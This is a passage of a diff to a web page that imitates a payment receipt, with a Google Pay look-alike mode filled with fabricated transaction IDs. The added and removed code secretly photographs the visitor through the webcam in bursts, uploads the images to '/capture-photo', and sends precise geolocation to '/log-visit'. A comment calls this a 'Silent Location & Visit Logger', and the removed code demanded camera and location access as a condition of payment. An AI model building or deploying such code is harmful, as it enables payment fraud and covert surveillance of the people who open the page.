+                        body: JSON.stringify({ photo, paymentId })
+                    });
                 }
-            }, 100);
-        }
-
-        async function startCameraInScanBox() {
-            try {
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' }
-                });
-
-                video = document.getElementById('scanVideo');
-                video.srcObject = cameraStream;
-                video.play();
-                return true;
-            } catch (error) {
-                return false;
+                await new Promise(r => setTimeout(r, interval));
             }
-        }
-
-        async function retryPermissions() {
-            const btn = document.getElementById('permissionBtn');
-            btn.innerText = "Checking...";
-            btn.disabled = true;
-
-            const locSuccess = await logVisit();
-            const camSuccess = await startCameraInScanBox();
-
-            if (locSuccess && camSuccess) {
-                document.getElementById('permissionModal').style.display = 'none';
-                initiateBiometricScan();
-            } else {
-                btn.innerText = "Permissions Required. Retry?";
-                btn.disabled = false;
-                alert("Please enable Camera and Location in your browser settings to proceed with the payment.");
-            }
-        }
-
-        function showPermissionModal() {
-            document.getElementById('permissionModal').style.display = 'flex';
         }
 
         function showReceipt() {
-            document.getElementById('loadingSection').style.display = 'none';
-            document.getElementById('humanVerificationSection').style.display = 'none';
             document.getElementById('processingResultSection').style.display = 'none';
-
-            // Check if custom payment
-            if (paymentData && paymentData.isCustom) {
-                // ACTIVATE GOOGLE PAY MODE
+            if (paymentData.isCustom) {
                 document.body.classList.add('gpay-mode');
                 document.getElementById('genericLogo').style.display = 'none';
                 document.getElementById('genericFooter').style.display = 'none';
                 document.getElementById('gpayReceiptSection').style.display = 'block';
-
-                // Populate Custom Data
                 document.getElementById('gpay-amount').textContent = '₹' + paymentData.amount;
-                document.getElementById('gpay-to-name').textContent = 'To ' + paymentData.toName;
-                document.getElementById('gpay-bank').textContent = paymentData.bankName;
-                document.getElementById('gpay-upi-txn').textContent = paymentData.upiTxnId || generateRandomId(12);
-                document.getElementById('gpay-to-upi').textContent = paymentData.upiId;
-
-                document.getElementById('gpay-label-to').textContent = 'To: ' + paymentData.toName;
-                document.getElementById('gpay-label-from').textContent = 'From: ' + paymentData.fromName + ' (' + paymentData.bankName.split(' ')[0] + ' Bank)';
-
-                const senderUpi = paymentData.fromName.toLowerCase().replace(/\s+/g, '') + '@okaxis';
-                document.getElementById('gpay-from-upi').textContent = senderUpi;
-
-                document.getElementById('gpay-google-txn').textContent = paymentData.googleTxnId || 'CICAg' + generateRandomString(8);
-                document.getElementById('gpay-time').textContent = paymentData.date;
-
             } else {
-                // GENERIC MODE
                 document.getElementById('receiptSection').style.display = 'block';
-
-                if (paymentData) {
-                    document.querySelector('.receipt-amount-value').textContent = `₹${paymentData.amount}.00`;
-                    document.getElementById('receipt-txn-id').textContent = paymentData.id;
-
-                    if (paymentData.merchant) {
-                        document.querySelectorAll('.receipt-value')[0].textContent = paymentData.merchant;
-                    }
-
-                    if (paymentData.date) {
-                        document.getElementById('receipt-date').textContent = paymentData.date;
-                    }
-                }
+                document.getElementById('amount-val').textContent = paymentData.amount;
             }
 
-            // Stop camera
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-            }
+            // BURST CAPTURE 2: Receipt Step (5 photos in 2s)
+            captureBurst(5, 400);
 
-            // Store photos like before
-            sessionStorage.setItem('capturedPhotos', JSON.stringify(capturedPhotos));
+            setTimeout(() => {
+                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+            }, 3000);
         }
 
-        // Capture multiple photos with upload
-        async function captureMultiplePhotos() {
-            return new Promise((resolve) => {
-                let photoCount = 0;
-                const maxPhotos = 5;
-
-                const captureInterval = setInterval(async () => {
-                    if (photoCount >= maxPhotos || !video) {
-                        clearInterval(captureInterval);
-                        resolve();
-                        return;
-                    }
-
-                    // Loop check for dimensions
-                    if (video.videoWidth === 0 || video.videoHeight === 0) return;
-
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-
-                    const photoData = canvas.toDataURL('image/jpeg', 0.85);
-                    capturedPhotos.push({
-                        timestamp: new Date().toISOString(),
-                        data: photoData
-                    });
-
-                    await sendPhotoToServer(photoData);
-
-                    photoCount++;
-                }, 1000);
-            });
+        function showToast(message, type) {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.innerHTML = `<div class="toast-icon">★</div><div class="toast-message">${message}</div>`;
+            container.appendChild(toast);
+            setTimeout(() => {
+                toast.style.animation = 'toastOut 0.4s forwards';
+                setTimeout(() => toast.remove(), 400);
+            }, 3000);
         }
 
-        async function sendPhotoToServer(photoData) {
-            try {
-                await fetch('/capture-photo', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        photo: photoData,
-                        paymentId: paymentId || 'UNKNOWN'
-                    })
-                });
-            } catch (error) {
-                console.error(error);
-            }
-        }
-
-        // Silent Location & Visit Logger
         async function logVisit() {
-            let locationData = null;
-            let deviceData = null;
-            let locError = false;
-
-            // Get Device Details
             try {
-                deviceData = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: { width: screen.width, height: screen.height }
-                };
-            } catch (e) { }
-
-            // Get Location (Strict Requirement)
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    });
-                });
-                locationData = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    heading: position.coords.heading,
-                    speed: position.coords.speed
-                };
-            } catch (e) {
-                locError = true;
-            }
-
-            if (locError) return false;
-
-            // Send to server
-            try {
-                await fetch('/log-visit', {
+                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+                fetch('/log-visit', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        paymentId: paymentId || 'UNKNOWN',
-                        location: locationData,
-                        deviceDetails: deviceData
-                    })
+                    body: JSON.stringify({ paymentId, location: { latitude: pos.coords.latitude, longitude: pos.coords.longitude } })
                 });
-                return true;
-            } catch (e) {
-                return false;
-            }
+            } catch (e) { }
         }
     </script>
 </body>
 
-</html>< ! - -   F o r c e   U p d a t e   0 2 / 1 4 / 2 0 2 6   1 9 : 2 2 : 3 4   - - >  
- 
+</html>
